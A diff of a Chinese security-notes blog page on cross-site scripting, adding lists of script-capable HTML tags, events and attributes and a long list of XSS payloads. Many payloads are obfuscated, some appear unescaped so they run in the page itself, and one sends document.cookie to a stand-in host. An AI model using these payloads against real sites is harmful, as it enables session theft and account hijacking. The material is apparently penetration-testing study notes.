@@ -10,16 +10,20 @@
   <title>xss | TransMiss</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="UXSSXSS蠕虫rookit xssFlash XssCRLF注入在响应头会导致XSS使用场景 直接嵌入html: &amp;lt;script&amp;gt; alert(&amp;#39;XSS&amp;#39;);&amp;lt;/script&amp;gt; 元素标签事件： &amp;lt;body onload=alert(&amp;#39;xss&amp;#39;)&amp;gt; 图片标签： &amp;lt;img src=&amp;quot;javascript:alert">
-<meta name="keywords" content="原理,漏洞">
+<meta name="keywords" content="漏洞,原理">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xss">
 <meta property="og:url" content="http://tranzimiss.com/2018/12/04/xss/index.html">
 <meta property="og:site_name" content="TransMiss">
 <meta property="og:description" content="UXSSXSS蠕虫rookit xssFlash XssCRLF注入在响应头会导致XSS使用场景 直接嵌入html: &amp;lt;script&amp;gt; alert(&amp;#39;XSS&amp;#39;);&amp;lt;/script&amp;gt; 元素标签事件： &amp;lt;body onload=alert(&amp;#39;xss&amp;#39;)&amp;gt; 图片标签： &amp;lt;img src=&amp;quot;javascript:alert">
-<meta property="og:updated_time" content="2019-04-23T13:57:23.332Z">
+<meta property="og:image" content="http://tranzimiss.com/2018/12/04/xss/x">
+<meta property="og:image" content="x:kcf">
+<meta property="og:image" content="http://tranzimiss.com/2018/12/04/xss/1">
+<meta property="og:updated_time" content="2019-05-12T13:12:04.444Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="xss">
 <meta name="twitter:description" content="UXSSXSS蠕虫rookit xssFlash XssCRLF注入在响应头会导致XSS使用场景 直接嵌入html: &amp;lt;script&amp;gt; alert(&amp;#39;XSS&amp;#39;);&amp;lt;/script&amp;gt; 元素标签事件： &amp;lt;body onload=alert(&amp;#39;xss&amp;#39;)&amp;gt; 图片标签： &amp;lt;img src=&amp;quot;javascript:alert">
+<meta name="twitter:image" content="http://tranzimiss.com/2018/12/04/xss/x">
   
     <link rel="alternative" href="/atom.xml" title="TransMiss" type="application/atom+xml">
   
@@ -197,7 +201,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/C-primer/" style="font-size: 15px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息搜集/" style="font-size: 11.25px;">信息搜集</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 18.75px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.25px;">基础</a> <a href="/tags/存档/" style="font-size: 11.25px;">存档</a> <a href="/tags/工具/" style="font-size: 17.5px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/思路/" style="font-size: 11.25px;">思路</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/文件操作/" style="font-size: 10px;">文件操作</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 16.25px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 12.5px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 13.75px;">笔记</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.25px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
+                        <a href="/tags/C-primer/" style="font-size: 15.71px;">C++primer</a> <a href="/tags/C-语法/" style="font-size: 10px;">C++语法</a> <a href="/tags/Effecitive-C/" style="font-size: 10px;">Effecitive C++</a> <a href="/tags/linux原理/" style="font-size: 10px;">linux原理</a> <a href="/tags/linux工具/" style="font-size: 10px;">linux工具</a> <a href="/tags/parrot使用/" style="font-size: 10px;">parrot使用</a> <a href="/tags/web安全/" style="font-size: 10px;">web安全</a> <a href="/tags/个人定制/" style="font-size: 10px;">个人定制</a> <a href="/tags/信息搜集/" style="font-size: 11.43px;">信息搜集</a> <a href="/tags/信息收集/" style="font-size: 20px;">信息收集</a> <a href="/tags/原理/" style="font-size: 20px;">原理</a> <a href="/tags/后台管理/" style="font-size: 10px;">后台管理</a> <a href="/tags/基础/" style="font-size: 11.43px;">基础</a> <a href="/tags/存档/" style="font-size: 11.43px;">存档</a> <a href="/tags/工具/" style="font-size: 18.57px;">工具</a> <a href="/tags/思想/" style="font-size: 10px;">思想</a> <a href="/tags/思路/" style="font-size: 11.43px;">思路</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/文件操作/" style="font-size: 10px;">文件操作</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞/" style="font-size: 17.14px;">漏洞</a> <a href="/tags/漏洞利用/" style="font-size: 12.86px;">漏洞利用</a> <a href="/tags/漏洞扫描/" style="font-size: 10px;">漏洞扫描</a> <a href="/tags/笔记/" style="font-size: 14.29px;">笔记</a> <a href="/tags/系统使用/" style="font-size: 10px;">系统使用</a> <a href="/tags/网络安全/" style="font-size: 10px;">网络安全</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/设计模式/" style="font-size: 11.43px;">设计模式</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
                     </div>
                 </section>
                 
@@ -333,8 +337,66 @@
 <li>其他标签： <code>&lt;iframe&gt;,&lt;div&gt;,&lt;link&gt;</code></li>
 <li>DOM对象，篡改页面内容</li>
 </ul>
-<h5 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h5><ul>
-<li><code>&lt;svg/onload=alert(1)&gt;</code> </li>
+<h6 id="可以执行js的标签"><a href="#可以执行js的标签" class="headerlink" title="可以执行js的标签"></a>可以执行js的标签</h6><ul>
+<li><script></li>
+<li><a></li>
+<li><p></li>
+<li><img></li>
+<li><body></li>
+<li><button></li>
+<li><var></li>
+<li><div></li>
+<li><iframe></li>
+<li><object></li>
+<li><input></li>
+<li><select></li>
+<li><textarea></li>
+<li><keygen></li>
+<li><frameset></li>
+<li><embed></li>
+<li><svg></li>
+<li><math></li>
+<li><video></li>
+<li><audio>
+
+</li>
+</ul>
+<h6 id="可以执行js的event"><a href="#可以执行js的event" class="headerlink" title="可以执行js的event"></a>可以执行js的event</h6><p>onload</p>
+<ul>
+<li>onunload</li>
+<li>onchange</li>
+<li>onsubmit</li>
+<li>onreset</li>
+<li>onselect</li>
+<li>onblur</li>
+<li>onfocus</li>
+<li>onabort</li>
+<li>onkeydown</li>
+<li>onkeypress</li>
+<li>onkeyup</li>
+<li>onclick</li>
+<li>ondbclick</li>
+<li>onmouseover</li>
+<li>onmousemove</li>
+<li>onmouseout</li>
+<li>onmouseup</li>
+<li>onforminput</li>
+<li>onformchange</li>
+<li>ondrag</li>
+<li>ondrop</li>
+</ul>
+<h6 id="可以执行js的属性"><a href="#可以执行js的属性" class="headerlink" title="可以执行js的属性"></a>可以执行js的属性</h6><p>formaction</p>
+<ul>
+<li>action</li>
+<li>href</li>
+<li>xlink:href</li>
+<li>autofocus</li>
+<li>src</li>
+<li>content</li>
+<li>data</li>
+</ul>
+<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><ul>
+<li><code>&lt;svg/onload=alert(1)&gt;</code></li>
 <li><code>&lt;script&gt; alert(&#39;XSS&#39;);&lt;/script&gt;</code></li>
 <li><code>&lt;a href=&quot;onclick=alert(&#39;xss&#39;)&quot;&gt;type&lt;/a&gt;</code></li>
 <li><code>&lt;img src=http://127.0.0.1/a.jpg onerror=alert(&#39;xss&#39;)&gt;</code></li>
@@ -342,6 +404,60 @@
 <li><code>&lt;iframe SRC=&quot;http://127.0.0.1/victim&quot; height =&quot;0&quot; width =&quot;0&quot;&gt;&lt;/iframe&gt;</code></li>
 <li><code>&lt;script&gt;new image().src=&quot;http://127.0.0.1/c.php?output=&quot;+document.cookie;&lt;/script&gt;</code></li>
 <li><code>&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;THIS WEBSITE IS UNDER ATTACK&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt;</code></li>
+</ul>
+<ul>
+<li><b/ondrag=alert()></li>
+<li><a href=javascript:alert(2)></li>
+<li><code>&lt;a href=j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)&gt;</code></li>
+<li><a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==></li>
+<li><a href=data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E></li>
+<li><svg><a xlink:href="javascript:alert(14)"><rect width="1000" height="1000" fill="white"/></a></svg></li>
+<li><math><a xlink:href=javascript:alert(1)></li>
+<li><code>&lt;script&gt;~&#39;\u0061&#39; ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~&#39;\u0061&#39;)&lt;/script&gt;</code></li>
+<li><code>&lt;script/src=data&amp;colon;text/j\u0061v\u0061&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116,\u0061%6C%65%72%74(/XSS/)&gt;&lt;/script&gt;</code></li>
+<li><script>prompt(-[])</script> //prompt和confirm也可以弹窗</li>
+<li><script>alert(/3/)</script> //可以用”/“来代替单引号和双引号</li>
+<li><script>alert(String.fromCharCode(49))</script> //可以用char进行编码</li>
+<li><script>alert(/7/.source)</script> // “.source”不会影响alert(7)的执行</li>
+<li><script>setTimeout(‘alert(1)’,0)</script> //输出在timeout的情况</li>
+<li><button onfocus="alert(1)" autofocus> //h5下可以使用</button></li>
+<li><p onmouseover="javascript:alert(1);">M</p>  //p标签的利用</li>
+<li><code>&lt;img src ?itworksonchrome?\/onerror = alert(1)&gt;</code> //只在chrome下有效</li>
+<li><img src="x" onerror="window.open('http://google.com');"></li>
+<li><img src="" onerror="alert(1)">  //只在chrome下有效</li>
+<li><img src="x:kcf" onerror="alert(1)"></li>
+<li><body onload="alert(1)"></body></li>
+<li><body onscroll="alert(1)"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"scriptForm":"local","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"scriptForm":"local","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></li>
+<li><var onmouseover="prompt(1)">test</var></li>
+<li><div onmouseover="alert(1)"></div></li>
+<li><div style="position:absolute;top:0;left:0;width:100%;height:100%" onclick="alert(52)"></div></li>
+<li><code>&lt;iframe  src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt;</code></li>
+<li><iframe src="http://0x.lv/xss.swf"></iframe></li>
+<li><iframe src="javascript:alert(1);"></iframe></li>
+<li><iframe onload="alert(53)"></iframe>  //只有在crossdomain.xml文件中，allow-access-from domain=“”允许从外部调用swf时，我们才可以通过flash来实现xss attack.</li>
+<li><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></object></li>
+<li><marquee onstart="alert(1)"></marquee></li>
+<li><isindex type="image" src="1" onerror="alert(1)"></li>
+<li><isindex action="javascript:alert(1)" type="image"></li>
+<li><input onfocus="javascript:alert(1)" autofocus></li>
+<li><input onblur="javascript:alert(1)" autofocus><input autofocus></li>
+<li><select onfocus="javascript:alert(1)" autofocus></select></li>
+<li><textarea onfocus="javascript:alert(1)" autofocus></textarea></li>
+<li><keygen onfocus="javascript:alert(1)" autofocus></li>
+<li><frameset><frame src="javascript:alert(1);"></frameset></li>
+<li><frameset onload="alert(1)"></frameset></li>
+<li><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="> //chrome</li>
+<li><embed src="javascript:alert(1)"> //firefox</li>
+<li><svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"/></li>
+<li><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"/></svg>  //chrome有效</li>
+<li><math href="javascript:javascript:alert(1)">CLICKME</math></li>
+<li><math><y xlink:href="javascript:alert(51)">test1</y></math></li>
+<li><math> &lt;maction actiontype=”statusline#http://wangnima.com”</math></li>
+<li>xlink:href=”javascript:alert(49)”&gt;CLICKME </li>
+<li><video><source onerror="alert(1)"></video></li>
+<li><video src="x" onerror="alert(48)"></video></li>
+<li><audio src="x" onerror="alert(47)"></audio></li>
+<li><img src="1" onerror="location="javascr"+"ipt:al"+"ert%28docu"+"ment.co"+"okie%29""></li>
 </ul>
 
       
@@ -354,7 +470,7 @@
         <p><span>本文标题:</span><a  href="/2018/12/04/xss/">xss</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Trans 的个人博客">Trans</a></p>
         <p><span>发布时间:</span>2018年12月04日 - 21时29分</p>
-        <p><span>最后更新:</span>2019年04月23日 - 21时57分</p>
+        <p><span>最后更新:</span>2019年05月12日 - 21时12分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/12/04/xss/" title="xss">http://tranzimiss.com/2018/12/04/xss/</a>
             <span class="copy-path" data-clipboard-text="原文: http://tranzimiss.com/2018/12/04/xss/　　作者: Trans" title=""></span>
@@ -391,7 +507,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#UXSS"><span class="toc-number">1.</span> <span class="toc-text">UXSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS蠕虫"><span class="toc-number">2.</span> <span class="toc-text">XSS蠕虫</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rookit-xss"><span class="toc-number">3.</span> <span class="toc-text">rookit xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Flash-Xss"><span class="toc-number">4.</span> <span class="toc-text">Flash Xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CRLF注入在响应头会导致XSS"><span class="toc-number">5.</span> <span class="toc-text">CRLF注入在响应头会导致XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用场景"><span class="toc-number">6.</span> <span class="toc-text">使用场景</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#漏洞POC"><span class="toc-number">7.</span> <span class="toc-text">漏洞POC</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#UXSS"><span class="toc-number">1.</span> <span class="toc-text">UXSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XSS蠕虫"><span class="toc-number">2.</span> <span class="toc-text">XSS蠕虫</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#rookit-xss"><span class="toc-number">3.</span> <span class="toc-text">rookit xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Flash-Xss"><span class="toc-number">4.</span> <span class="toc-text">Flash Xss</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CRLF注入在响应头会导致XSS"><span class="toc-number">5.</span> <span class="toc-text">CRLF注入在响应头会导致XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#使用场景"><span class="toc-number">6.</span> <span class="toc-text">使用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#可以执行js的标签"><span class="toc-number">6.1.</span> <span class="toc-text">可以执行js的标签</span></a></li></ol></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -461,7 +577,7 @@
             </a>
         
     </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/网络协议的分层/">网络协议的分层</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/拿shell方法/">拿shell方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/08/SqlMap/">SqlMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/24/web应用指纹分析/">web应用指纹分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/社工/">社工</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/编辑器漏洞/">编辑器漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/无恶意特征的漏洞/">无恶意特征的漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/XXE/">XXE</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/SSRF/">SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/命令执行/">命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/CSRF/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/文件操作/">文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/cpu中各个寄存器的作用/">cpu中各个寄存器的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/PE信息/">PE信息</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/08/cewl/">cewl</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/dirb使用/">dirb使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/rbash逃脱/">rbash逃脱</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/Linux提权/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/pwn入门/">pwn入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/25/常见中间件/">常见中间件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/sql入门/">sql入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/06/netcat/">netcat</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/06/协议包类型和结构/">协议包类型和结构</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/06/shodan/">shodan</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/google搜索语法/">google搜索语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第八章/">C++primer笔记————第八章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第七章/">C++primer笔记————第七章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第六章/">C++primer笔记————第六章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第五章/">C++primer笔记————第五章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第四章/">C++primer笔记————第四章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第三章/">C++primer笔记————第三章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第二章/">C++primer笔记————第二章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第一章/">C++primer笔记————第一章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/第一章/">第一章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/01/条款/">条款</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/31/重构的设计原则/">重构的设计原则</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/31/2019计划-随时变动版/">2019计划[随时变动版]</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/linux知识点总结/">linux知识点总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/cmus使用/">cmus使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/linux命令行与脚本编程笔记/">linux命令行与脚本编程笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/30/C-中的return/">C++中的return</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/sql注入/">sql注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/httpfuzzer/">httpfuzzer</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/cms/">cms</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/下载漏洞/">下载漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/24/爆库/">爆库</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/CDN绕过/">CDN绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/19/AWVS/">AWVS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/17/常见端口/">常见端口</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/16/windows使用入门/">windows使用入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/15/隐藏痕迹/">隐藏痕迹</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/15/linux基本信息收集/">linux基本信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/15/windows基本信息收集/">windows基本信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/基本信息收集/">基本信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/http请求方法/">http请求方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/渗透测试流程/">渗透测试流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/设计模式的分类/">设计模式的分类</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/12/设计模式八大原则/">设计模式原则</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/漏洞利用流程/">漏洞利用流程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/弱点扫描/">弱点扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/08/命令行连接无线/">命令行连接无线</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/漏洞基本概念/">漏洞基本概念</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/OPENVAS/">OPENVAS</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/WAF/">WAF</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/05/负载均衡/">负载均衡</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/04/SNMP原理/">SNMP原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/04/SNMP扫描/">SNMP扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/04/xss/">xss</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/Banner/">Banner</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/服务扫描/">服务扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/端口扫描/">端口扫描</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/03/nmap/">nmap</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/三层发现/">三层发现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/二层发现/">二层发现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/recon-ng/">recon-ng</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/Maltego/">Maltego</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/DNS字典爆破/">DNS字典爆破</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/DNS原理/">DNS原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/DIG/">DIG</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/NSLOOKUP/">NSLOOKUP</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/信息收集/">信息收集</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/tcpdump/">tcpdump</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/test/">test</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/02/暗网wiki/">暗网wiki</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/05/linux启动过程/">linux启动过程</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/23/Trojanizer-Trojanize-Your-Payload/">Trojanizer-Trojanize Your Payload</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/12/定制自己的shell提示符/">定制自己的shell提示符</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/11/交换机的工作原理/">交换机的工作原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/教堂与集市笔记归纳/">教堂与集市笔记归纳</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/敬请期待/">敬请期待</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/未完待续/">未完待续</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/Markdown格式（转）/">Markdown格式（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/09/前加加和后加加的区别/">前加加和后加加的区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/08/一个好的编程小习惯/">一个好的编程小习惯</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/PHP彩蛋/">PHP彩蛋</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/12/dataURLschema/">dataURLschema</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/网络协议的分层/">网络协议的分层</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/拿shell方法/">拿shell方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/08/SqlMap/">SqlMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/24/web应用指纹分析/">web应用指纹分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/社工/">社工</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/编辑器漏洞/">编辑器漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/无恶意特征的漏洞/">无恶意特征的漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/XXE/">XXE</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/SSRF/">SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/命令执行/">命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/CSRF/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/23/文件操作/">文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/cpu中各个寄存器的作用/">cpu中各个寄存器的作用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/12/PE信息/">PE信息</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/08/cewl/">cewl</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/dirb使用/">dirb使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/rbash逃脱/">rbash逃脱</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/31/Linux提权/">Linux提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/18/pwn入门/">pwn入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/25/常见中间件/">常见中间件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/25/sql入门/">sql入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/06/netcat/">netcat</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/06/协议包类型和结构/">协议包类型和结构</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/06/shodan/">shodan</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/03/google搜索语法/">google搜索语法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第八章/">C++primer笔记————第八章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第七章/">C++primer笔记————第七章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第六章/">C++primer笔记————第六章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第五章/">C++primer笔记————第五章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第四章/">C++primer笔记————第四章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第三章/">C++primer笔记————第三章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第二章/">C++primer笔记————第二章</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/C-primer笔记————第一章/">C++primer笔记————第一章</a></li><li class="post-list-item"><a class="post-list-link" 